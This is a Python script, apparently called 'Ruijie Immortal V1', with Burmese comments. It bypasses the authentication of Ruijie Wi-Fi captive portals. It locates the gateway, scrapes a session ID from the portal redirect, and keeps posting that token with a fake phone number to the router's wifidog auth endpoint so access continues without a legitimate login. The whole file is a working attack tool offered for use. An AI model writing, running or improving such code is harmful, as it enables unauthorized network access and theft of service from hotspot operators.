import os
import re
import time
import ping3
import aiohttp
import asyncio
import requests

# UI Colors
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

class RuijieImmortal:
    def __init__(self):
        self.session_url_file = ".session_url"
        self.ip_file = ".ip"

    async def get_session_id(self, session, session_url):
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
        try:
            async with session.get(session_url, headers=headers, timeout=8) as req:
                response = str(req.url)
                return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
        except:
            return None

    async def check_net(self, session):
        try:
            async with session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3) as req:
                return req.status == 204
        except:
            return False

    def get_ping(self):
        try:
            p = ping3.ping('1.1.1.1', timeout=1)
            if p is None: return f"{r}Lost{w}"
            ms = int(p * 1000)
            return f"{g if ms < 100 else y}{ms}ms{w}"
        except:
            return f"{r}Err{w}"

    async def start_bypass(self):
        # ဖိုင်မရှိရင် setup အရင်လုပ်မယ်
        if not os.path.exists(self.ip_file) or not os.path.exists(self.session_url_file):
            if not run_setup():
                print(f"{r}[!] Setup မအောင်မြင်ပါ။ Wi-Fi ပြန်စစ်ပါ။{w}")
                return

        try:
            ip = open(self.ip_file).read().strip()
            url = open(self.session_url_file).read().strip()
        except Exception as e:
            print(f"{r}[!] ဖိုင်ဖတ်မရပါ: {e}{w}")
            return

        print(f"{g}[+] Auto-Reconnect & Speed Mode Active{w}")
        
        conn = aiohttp.TCPConnector(limit=20, keepalive_timeout=60)
        async with aiohttp.ClientSession(connector=conn) as session:
            session_id = None
            
            while True:
                if session_id is None:
                    print(f"{y}[*] Reconnecting...{w}")
                    session_id = await self.get_session_id(session, url)
                    if session_id: print(f"{g}[+] Reconnected!{w}")

                if session_id:
                    params = {'token': session_id, 'phoneNumber': str(int(time.time()))[-6:]}
                    try:
                        async with session.post(f'http://{ip}:2060/wifidog/auth?', params=params, timeout=5) as res:
                            is_ok = await self.check_net(session)
                            status_text = f"{g}Connected{w}" if is_ok else f"{r}Bypassing{w}"
                            ping = self.get_ping()
                            
                            print(f"[{time.strftime('%H:%M:%S')}] Net: {status_text} | Ping: {ping}")

                            if is_ok:
                                await asyncio.sleep(0.8)
                            else:
                                await asyncio.sleep(0.3)
                    except:
                        session_id = None
                        await asyncio.sleep(1)
                else:
                    await asyncio.sleep(2)

def run_setup():
    print(f"{y}[*] Searching Router...{w}")
    # IP List ကို ပိုစုံအောင် ထည့်ထားပေးတယ်
    gateways = ["192.168.0.1", "192.168.1.1", "10.44.77.240", "192.168.10.1", "192.168.110.1"]
    for gw in gateways:
        try:
            res = requests.get(f"http://{gw}", timeout=4)
            land_url = res.url
            if "gw_address" in land_url:
                ip = re.search('gw_address=(.*?)&', land_url).group(1)
                req_text = requests.get(land_url).text
                s_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", req_text).group(1)
                with open(".ip", "w") as f: f.write(ip)
                with open(".session_url", "w") as f: f.write(s_url)
                print(f"{g}[+] Setup OK: {ip}{w}")
                return True
        except Exception as e:
            continue
    return False

if __name__ == "__main__":
    os.system("clear")
    print(f"{b}=== Ruijie Immortal V1 (Fixed) ==={w}")
    try:
        bot = RuijieImmortal()
        asyncio.run(bot.start_bypass())
    except KeyboardInterrupt:
        print(f"\n{y}[*] User Stopped.{w}")
    except Exception as e:
        print(f"{r}[!] Runtime Error: {e}{w}")
